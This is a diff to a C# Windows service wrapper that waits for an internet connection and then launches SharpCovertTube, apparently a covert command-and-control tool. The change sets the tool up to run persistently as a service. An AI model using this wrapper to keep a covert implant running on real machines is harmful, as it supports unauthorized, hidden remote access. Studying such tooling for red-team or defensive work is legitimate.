@@ -1,8 +1,6 @@
-﻿using System.Timers;
-using System.Diagnostics;
-using System.ServiceProcess;
+﻿using System.ServiceProcess;
 using System.Runtime.InteropServices;
-
+using System.IO;
 
 public enum ServiceState
 {
@@ -37,6 +35,9 @@ namespace SharpCovertTube_Service
         [DllImport("advapi32.dll", SetLastError = true)]
         private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);
 
+        [DllImport("wininet.dll")]
+        private extern static bool InternetGetConnectedState(out int Description, int ReservedValue);
+
 
         public SharpCovertTube_Service()
         {
@@ -52,6 +53,13 @@ namespace SharpCovertTube_Service
         }
 
 
+        public static bool IsConnectedToInternet()
+        {
+            int Desc;
+            return InternetGetConnectedState(out Desc, 0);
+        }
+
+
         protected override void OnStart(string[] args)
         {
             // Update the service state to Start Pending.
@@ -62,24 +70,19 @@ namespace SharpCovertTube_Service
 
             eventLog1.WriteEntry("Starting service...");
 
-            // Set up a timer that triggers every minute.
-            Timer timer = new Timer();
-            timer.Interval = 60000; // 60 seconds
-            timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
-            timer.Start();
+            while (!IsConnectedToInternet())
+            {
+                System.Threading.Thread.Sleep(1000 * 60);
+            }
+
+            eventLog1.WriteEntry("Got internet connection...");
+            System.Threading.Thread.Sleep(1000 * 2);
+            SharpCovertTube.Start();
 
             // Update the service state to Running.
             serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
             SetServiceStatus(this.ServiceHandle, ref serviceStatus);
         }
-
-
-        public void OnTimer(object sender, ElapsedEventArgs args)
-        {
-            // TODO: Insert monitoring activities here.
-            eventLog1.WriteEntry("Monitoring the System", EventLogEntryType.Information, eventId++);
-        }
-
 
         protected override void OnStop()
         {
@@ -89,17 +92,11 @@ namespace SharpCovertTube_Service
             serviceStatus.dwWaitHint = 100000;
             SetServiceStatus(this.ServiceHandle, ref serviceStatus);
 
-            eventLog1.WriteEntry("In OnStop.");
+            eventLog1.WriteEntry("Stopping service...");
 
             // Update the service state to Stopped.
             serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;
             SetServiceStatus(this.ServiceHandle, ref serviceStatus);
-        }
-
-
-        protected override void OnContinue()
-        {
-            eventLog1.WriteEntry("In OnContinue.");
         }
     }
 }
